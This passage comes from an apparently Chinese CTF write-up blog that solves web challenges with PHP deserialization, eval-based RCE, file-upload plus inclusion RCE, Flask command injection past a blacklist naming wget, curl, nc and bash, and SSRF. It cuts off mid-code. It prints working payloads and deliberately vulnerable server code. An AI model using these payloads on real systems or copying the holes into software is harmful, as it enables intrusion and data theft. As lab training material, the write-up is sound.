class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mouse</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br><br>   <span class="hljs-comment">// public function __toString()</span><br>   <span class="hljs-comment">//  &#123;</span><br>   <span class="hljs-comment">//      echo &quot;Good. You caught the mouse:&quot;;</span><br>   <span class="hljs-comment">//      include($this-&gt;v);</span><br>      <br>   <span class="hljs-comment">//  &#125;</span><br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cat</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br><br>    <span class="hljs-comment">// public function __destruct()&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;dog();</span><br>    <span class="hljs-comment">//     $this-&gt;b = $this-&gt;c;</span><br>    <span class="hljs-comment">//     // $this-&gt;a=new mouse;</span><br>    <span class="hljs-comment">//     die($this-&gt;a);</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function dog()</span><br>    <span class="hljs-comment">// &#123; </span><br>    <span class="hljs-comment">//     $this-&gt;a = &quot;I&#x27;m a vicious dog, Kitty&quot;;    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125; <br><br><span class="hljs-variable">$gg</span>=<span class="hljs-keyword">new</span> cat;<br><span class="hljs-variable">$mm</span>=<span class="hljs-keyword">new</span> mouse;<br><span class="hljs-variable">$gg</span>-&gt;a=<span class="hljs-variable">$mm</span>;<br><span class="hljs-variable">$gg</span>-&gt;b=&amp;<span class="hljs-variable">$gg</span>-&gt;a;<br><span class="hljs-variable">$gg</span>-&gt;c=<span class="hljs-keyword">new</span> mouse;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$gg</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过引用使$b与$a指向同一地址，a在dog函数被改变，在b赋值时再次使其变为mouse的对象。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?cat=O:<span class="hljs-number">3</span>:%22cat%22:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:%22a%22;O:<span class="hljs-number">5</span>:%22mouse%22:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:%22v%22;s:<span class="hljs-number">57</span>:%22php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php%22;&#125;s:<span class="hljs-number">1</span>:%22b%22;R:<span class="hljs-number">2</span>;s:<span class="hljs-number">1</span>:%22c%22;O:<span class="hljs-number">5</span>:%22mouse%22:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:%22v%22;s:<span class="hljs-number">57</span>:%22php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php%22;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323623.png" alt="image-20221027214949558"></p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ERROR);<br><br><br><br><span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$arr</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good try!&quot;</span>;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;come on!!!&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br><br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>    &#125;<br><br><br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?str<span class="hljs-operator">=</span><span class="hljs-variable">%23</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>fIlikeisctf<span class="hljs-variable">%23</span>&amp;num<span class="hljs-operator">=</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span>&amp;cmd<span class="hljs-operator">=</span>system(&#x27;cat /flag&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323624.png" alt="image-20221028185245548"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>扫描发现源码泄露<a href="http://www.rar/">www.rar</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no hack&quot;</span>;<br> <span class="hljs-keyword">exit</span>();<br>&#125; <br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;upload.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那就简单了，上传ha.jpg，文件包含rce（过滤了POST）</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323626.png" alt="image-20221028185333599"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?file=./u</span>plO4d<span class="hljs-regexp">/ha.jpg&amp;1=system(&#x27;cat /</span>flag<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323627.png" alt="image-20221028185350454"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-comment">// 允许上传的图片后缀</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>];<br><span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);     <span class="hljs-comment">// 获取文件后缀名</span><br><br><span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>))<br>&amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">15360</span>)   <span class="hljs-comment">// 小于 15 kb</span><br>&amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]), <span class="hljs-string">&quot;POST&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NO! HACKER!&quot;</span>;<br>        &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件大小: &quot;</span> . (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件临时存储的位置: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// 判断当前目录下的 upload 目录是否存在该文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;uplO4d/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在。 &quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br>            <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;uplO4d/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储在: &quot;</span> . <span class="hljs-string">&quot;uplO4d/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法的文件格式&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="eazy-onlineshell"><a href="#eazy-onlineshell" class="headerlink" title="eazy-onlineshell"></a>eazy-onlineshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> subprocess<br><br>app = flask.Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Try to access the /rce&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/www.zip&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">return_SourceCode</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/rce&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action_rce</span>():<br>    <span class="hljs-keyword">if</span> flask.request.method == <span class="hljs-string">&quot;GET&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Why not try to search the backup&quot;</span><br>    <span class="hljs-keyword">elif</span> flask.request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        action = flask.request.form[<span class="hljs-string">&quot;act&quot;</span>]<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/temp.sh&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(action[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br>        res = subprocess.run([<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)<br>        <span class="hljs-comment"># print(res)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>反弹shell不知道为啥没反弹上，利用app.py即可</p><p>猜测路径为&#x2F;app&#x2F;app.py</p><p>使用&gt;&gt;将命令结果追加到文件后面</p><p>payload：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">act</span><span class="hljs-operator">=</span>gcat flag&gt;&gt; /app/app.pyg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323628.png" alt="image-20221028201737135"></p><p>接着访问<a href="http://www.zip/">www.zip</a></p><p>在文件末尾得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323629.png" alt="image-20221028201815653"></p><h2 id="crazy-onlineshell"><a href="#crazy-onlineshell" class="headerlink" title="crazy-onlineshell"></a>crazy-onlineshell</h2><p>比上题加了黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> subprocess<br><br>app = flask.Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Try to access the /rce&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/www.zip&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">return_SourceCode</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/rce&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action_rce</span>():<br>    <span class="hljs-keyword">if</span> flask.request.method == <span class="hljs-string">&quot;GET&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Why not try to search the backup&quot;</span><br>    <span class="hljs-keyword">elif</span> flask.request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        action = flask.request.form[<span class="hljs-string">&quot;act&quot;</span>]<br>        <span class="hljs-keyword">for</span> ban_words <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;wget&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;nc&quot;</span>, <span class="hljs-string">&quot;httpie&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;dnslog&quot;</span>]:<br>            <span class="hljs-keyword">if</span> action.find(ban_words) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/temp.sh&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(action[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br>        res = subprocess.run([<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)<br>        <span class="hljs-comment"># print(res)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>同上题一样解法， 直接秒</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323630.png" alt="image-20221030152340684"></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323631.png" alt="image-20221030104025439"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;urls&#x27;</span>]))&#123;<br><span class="hljs-variable">$urls</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;urls&#x27;</span>];<br><span class="hljs-variable">$url_host</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$urls</span>,PHP_URL_HOST);<br><span class="hljs-comment">//Do something~~~~</span><br><span class="hljs-title function_ invoke__">curl_get</span>(<span class="hljs-variable">$urls</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>127.0.0.1都不需要绕过</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">urls</span>=127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323632.png" alt="image-20221030104146077"></p><h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) 